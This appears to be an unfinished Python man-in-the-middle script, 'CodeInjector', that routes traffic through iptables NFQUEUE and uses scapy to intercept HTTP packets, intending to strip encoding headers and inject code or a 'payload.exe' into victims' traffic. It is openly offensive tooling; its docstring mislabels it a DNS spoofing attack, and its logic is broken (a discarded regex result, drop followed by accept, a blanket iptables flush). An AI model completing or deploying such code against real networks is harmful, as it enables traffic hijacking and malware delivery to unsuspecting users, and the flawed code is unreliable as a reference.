import os, sys
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http
import re

class CodeInjector:
    def __init__(self, testing:bool = False):
        """
        Run as MITM, with a running web server
        Best way to do it is to redirect to a web server running on the local machin and put as subsitution_ip the wifi ip of local machine
        """
        if testing :
            subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num","0"])
            subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num","0"])
        else :
            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num","0"])
        self.queue = netfilterqueue.NetfilterQueue()
        self.ack_list = []
        

    def run(self, drop:bool = False, payload_path:str = "127.0.0.1/payload.exe"):
        """
        Run a DNS spoofing attack
        """
        self.payload_path = payload_path
        self.drop = drop
        self.queue.bind(0, self.process)
        self.queue.run()
        subprocess.call(["iptables", "--flush"])

    def process(self, packet):
        """
        Process the desired packet to modify it
        """
        scp_packet = scapy.IP(packet.get_payload())
        #Work only on HTTP response, source/destination port 80
        if scp_packet.haslayer(scapy.Raw) and scp_packet.haslayer(scapy.TCP):
            #Request
            if scp_packet[scapy.TCP].dport == 80:
                r_pattern = "Accept-Encoding:.*?\\r\\n"
                re.sub(r_pattern, "", scp_packet[scapy.Raw].load)
                print("request")
                
            elif scp_packet[scapy.TCP].sport == 80:
                #Answer is relevant?
                print('response')

        packet.set_payload(bytes(scp_packet))
        if self.drop:
            packet.drop()
        packet.accept()


    def __del__(self):
        subprocess.call(["iptables", "--flush"])

if __name__=="__main__":
    s = CodeInjector(testing=True)
    s.run()